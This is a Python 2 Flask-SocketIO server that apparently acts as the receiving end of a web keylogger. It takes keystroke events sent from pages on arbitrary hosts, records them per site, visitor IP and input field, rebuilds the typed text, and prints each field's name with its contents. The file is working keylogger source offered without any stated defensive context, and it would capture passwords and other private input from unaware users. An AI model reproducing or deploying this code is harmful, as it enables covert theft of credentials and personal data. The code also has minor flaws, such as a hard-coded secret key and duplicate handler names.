import json

from flask import Flask, render_template, request
from flask.ext.socketio import SocketIO, emit

ASCII_OFFSET = 73

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
#app.config['DEBUG'] = True
socketio = SocketIO(app)

data = { 'hosts': {}}

keyboardMap = [
  "",
  "",
  "", 
  "CANCEL", 
  "",
  "", 
  "HELP", 
  "", 
  "BACK_SPACE", 
  "TAB", 
  "", 
  "", 
  "CLEAR", 
  "ENTER", 
  "ENTER_SPECIAL", 
  "", 
  "SHIFT", 
  "CONTROL", 
  "ALT", 
  "PAUSE",  
  "CAPS_LOCK",
  "KANA", 
  "EISU", 
  "JUNJA",
  "FINAL", 
  "HANJA", 
  "", 
  "ESCAPE", 
  "CONVERT",
  "NONCONVERT", 
  "ACCEPT", 
  "MODECHANGE",
  " ", 
  "PAGE_UP", 
  "PAGE_DOWN", 
  "END", 
  "HOME", 
  "LEFT", 
  "UP", 
  "RIGHT", 
  "DOWN", 
  "SELECT",
  "PRINT", 
  "EXECUTE",
  "PRINTSCREEN", 
  "INSERT", 
  "DELETE", 
  "", 
  "0", 
  "1", 
  "2", 
  "3", 
  "4", 
  "5", 
  "6", 
  "7", 
  "8", 
  "9", 
  ":", 
  ";", 
  "LESS_THAN", 
  "EQUALS", 
  "GREATER_THAN", 
  "QUESTION_MARK",
  "@",
  "a", 
  "b", 
  "c", 
  "d", 
  "e", 
  "f", 
  "g", 
  "h", 
  "i", 
  "j", 
  "k", 
  "l", 
  "m", 
  "n", 
  "o", 
  "p", 
  "q", 
  "r", 
  "s", 
  "t", 
  "u", 
  "v", 
  "w", 
  "x", 
  "y", 
  "z",  
  "OS_KEY", 
  "", 
  "CONTEXT_MENU", 
  "", 
  "SLEEP", 
  "NUMPAD0", 
  "NUMPAD1", 
  "NUMPAD2", 
  "NUMPAD3", 
  "NUMPAD4", 
  "NUMPAD5", 
  "NUMPAD6", 
  "NUMPAD7", 
  "NUMPAD8", 
  "NUMPAD9", 
  "MULTIPLY",
  "ADD", 
  "SEPARATOR",
  "SUBTRACT",
  "DECIMAL",
  "DIVIDE",
  "F1", 
  "F2", 
  "F3", 
  "F4", 
  "F5", 
  "F6", 
  "F7", 
  "F8", 
  "F9", 
  "F10",
  "F11",
  "F12",
  "F13",
  "F14",
  "F15",
  "F16",
  "F17",
  "F18",
  "F19",
  "F20",
  "F21",
  "F22",
  "F23",
  "F24",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "NUM_LOCK",
  "SCROLL_LOCK", 
  "WIN_OEM_FJ_JISHO",
  "WIN_OEM_FJ_MASSHOU",
  "WIN_OEM_FJ_TOUROKU",
  "WIN_OEM_FJ_LOYA",
  "WIN_OEM_FJ_ROYA",
  "", 
  "", 
  "", 
  "", 
  "", 
  "", 
  "", 
  "", 
  "", 
  "CIRCUMFLEX", 
  "EXCLAMATION", 
  "DOUBLE_QUOTE",
  "HASH", 
  "DOLLAR", 
  "PERCENT", 
  "AMPERSAND", 
  "UNDERSCORE", 
  "OPEN_PAREN", 
  "CLOSE_PAREN",
  "ASTERISK", 
  "PLUS",
  "PIPE",
  "HYPHEN_MINUS", 
  "OPEN_CURLY_BRACKET", 
  "CLOSE_CURLY_BRACKET",
  "TILDE", 
  "", 
  "", 
  "", 
  "", 
  "VOLUME_MUTE", 
  "VOLUME_DOWN", 
  "VOLUME_UP", 
  "", 
  "", 
  ";",
  "=",
  ",", 
  "-", 
  ".",
  "/", 
  "`",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "",
  "[", 
  "\\", 
  "]", 
  "\'", 
  "", 
  "META", 
  "ALTGR", 
  "", 
  "WIN_ICO_HELP", 
  "WIN_ICO_00", 
  "",
  "WIN_ICO_CLEAR",
  "", 
  "", 
  "WIN_OEM_RESET",
  "WIN_OEM_JUMP",
  "WIN_OEM_PA1", 
  "WIN_OEM_PA2", 
  "WIN_OEM_PA3", 
  "WIN_OEM_WSCTRL",
  "WIN_OEM_CUSEL",
  "WIN_OEM_ATTN", 
  "WIN_OEM_FINISH", 
  "WIN_OEM_COPY",  
  "WIN_OEM_AUTO",  
  "WIN_OEM_ENLW",  
  "WIN_OEM_BACKTAB", 
  "ATTN", 
  "CRSEL",
  "EXSEL",
  "EREOF",
  "PLAY", 
  "ZOOM", 
  "",
  "PA1",
  "WIN_OEM_CLEAR",
  ""
];
print keyboardMap.index('['), 'through', keyboardMap.index('\'')
print keyboardMap.index('=')-1, 'through', keyboardMap.index('/')
print keyboardMap.index('@'), 'through', keyboardMap.index('z')
print keyboardMap.index('0'), 'through', keyboardMap.index(';')

def is_printable(ks):
    return any([
        ks == 8,
        (ks >= 219 and ks <= 222),
        (ks >= 186 and ks <= 191),
        (ks >= 64 and ks <=  90),
        (ks >= 48 and ks <=  59),
    ])

shift_table = {
    '1' : '!',
    '2' : '@',
    '3' : '#',
    '4' : '$',
    '5' : '%%',
    '6' : '^',
    '7' : '&',
    '8' : '*',
    '9' : '(',
    '0' : ')',
    '-' : '_',
    '=' : '+',
    '[' : '{',
    ']' : '}',
    '\\': '|',
    ';' : ':',
    '\'': '"',
    ',' : '<',
    '.' : '>',
    '/' : '?',
    '`' : '~',
}

def pprint(s):

    print json.dumps(s, indent=4)

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect', namespace='/test')
def test_connect():
    print 'Client connected'
    emit('confirm connection', { 'data' : 'Connected' })

@socketio.on('disconnect', namespace='/test')
def test_connect():
    print 'Client disconnected'

def is_backspace(ks):
    return ks == 8

@socketio.on('keydown', namespace='/test')
def keydown(message):

    message['page_details']['ipaddr'] = request.remote_addr

    host = message['page_details']['url']['host']
    if host not in data['hosts']:
        data['hosts'][host] = { 'clients' : {}}
    
    ipaddr = message['page_details']['ipaddr']
    if ipaddr not in data['hosts'][host]['clients']:
        data['hosts'][host]['clients'][ipaddr] = { 'inputs' : {} }

    input_tag = message['data']['tag_details']
    if input_tag['_id'] not in data['hosts'][host]['clients'][ipaddr]['inputs']:

        #todo: ks->current needs to be a stack
        data['hosts'][host]['clients'][ipaddr]['inputs'][input_tag['_id']] = {
                                                    '_id' : input_tag['_id'],
                                                    'ks' : { 'current' : [],
                                                                'log' : []}}
        
    keystroke = message['data']['ks']
    ctrl_pressed = message['data']['ctrl']
    alt_pressed = message['data']['alt']
    shift_pressed = message['data']['shift']
    selection_start = message['data']['start_pos']
    selection_end = message['data']['end_pos']

    if ctrl_pressed or alt_pressed or not is_printable(keystroke):
        return

    keystroke = keyboardMap[keystroke]



    data['hosts'][host]['clients'][ipaddr]['inputs'][input_tag['_id']]['ks']['log'].append(keystroke)

    if keystroke == 'BACK_SPACE':

        
        if selection_start == selection_end and selection_start != 0:
            data['hosts'][host]['clients'][ipaddr]['inputs'][input_tag['_id']]['ks']['current'].pop(selection_start-1)
        else:
            current = data['hosts'][host]['clients'][ipaddr]['inputs'][input_tag['_id']]['ks']['current']
            current = current[:selection_start] + current[selection_end:]
            data['hosts'][host]['clients'][ipaddr]['inputs'][input_tag['_id']]['ks']['current'] = current
            
            
            
        
    elif not ( ctrl_pressed or alt_pressed):

        if shift_pressed:

            if keystroke in shift_table:
                keystroke = shift_table[keystroke]
            elif keystroke.isalpha():
                keystroke = keystroke.upper()
        data['hosts'][host]['clients'][ipaddr]['inputs'][input_tag['_id']]['ks']['current'].append(keystroke)


    print message['data']['tag_details']['name'], '-->',
    print ''.join(data['hosts'][host]['clients'][ipaddr]['inputs'][input_tag['_id']]['ks']['current'])

    #pprint(data)
    #pprint(message)

if __name__ == '__main__':
    socketio.run(app)
